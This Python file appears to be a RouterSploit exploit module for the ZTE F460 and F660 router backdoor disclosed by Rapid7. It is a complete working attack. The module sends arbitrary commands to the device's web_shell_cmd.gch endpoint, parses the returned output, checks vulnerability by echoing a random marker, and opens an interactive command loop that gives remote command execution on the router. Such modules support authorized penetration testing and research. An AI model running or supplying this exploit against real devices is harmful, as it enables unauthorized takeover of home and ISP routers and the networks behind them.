import re

from routersploit import (
    exploits,
    http_request,
    mute,
    validators,
    random_text,
    print_error,
    print_success,
    print_status,
    print_info
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for ZTE F460 and F660 Backdoor vulnerability.
    If the target is vulnerable it allows to execute commands on operating system level.
    """
    __info__ = {
        'name': 'ZTE F460 & F660 Backdoor RCE',
        'description': 'Exploits ZTE F460 and F660 backdoor vulnerability that allows executing commands on operating system level.',
        'authors': [
            'Rapid7',  # vulnerabilty discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://community.rapid7.com/community/infosec/blog/2014/03/04/disclosure-r7-2013-18-zte-f460-and-zte-f660-webshellcmdgch-backdoor',
        ],
        'devices': [
            'ZTE F460',
            'ZTE F660',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop")
            self.command_loop()
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")

            if cmd in ['exit', 'quit']:
                return

            print_info(self.execute(cmd))

    def execute(self, cmd):
        url = "{}:{}/web_shell_cmd.gch".format(self.target, self.port)
        headers = {u'Content-Type': u'multipart/form-data'}
        data = {'IF_ACTION': 'apply',
                'IF_ERRORSTR': 'SUCC',
                'IF_ERRORPARAM': 'SUCC',
                'IF_ERRORTYPE': '-1',
                'Cmd': cmd,
                'CmdAck': ''}

        response = http_request(method="POST", url=url, headers=headers, data=data)
        if response is None:
            return ""

        if response.status_code == 200:
            regexp = '<textarea cols="" rows="" id="Frm_CmdAck" class="textarea_1">(.*?)</textarea>'
            res = re.findall(regexp, response.text, re.DOTALL)

            if len(res):
                return res[0]

        return ""

    @mute
    def check(self):
        marker = random_text(32)
        cmd = "echo {}".format(marker)

        response = self.execute(cmd)
        if marker in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
